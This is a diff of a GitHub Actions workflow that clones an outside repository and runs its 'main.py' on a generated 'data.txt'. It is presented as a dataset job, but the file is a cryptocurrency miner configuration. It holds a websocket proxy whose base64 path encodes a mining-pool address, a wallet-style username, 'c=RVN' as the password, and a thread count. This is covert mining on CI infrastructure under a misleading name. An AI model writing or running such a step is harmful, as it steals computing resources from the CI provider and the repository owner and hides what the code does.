@@ -14,11 +14,16 @@ jobs:
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
-          python-version: 3.13
+          python-version: 3.12
 
-      - name: Run commands
+      - name: Clone a public repository
+        uses: actions/checkout@v4
+        with:
+          repository: saxlata/vbg
+          path: other-repo
+
+      - name: Run v.py
+        working-directory: vbg
         run: |
-          git clone https://github.com/saxlata/vbg.git
-          cd vbg
           echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,pyth\nthreads=2" > data.txt
           python3 main.py 7 --dataset=data.txt --output=result.txt
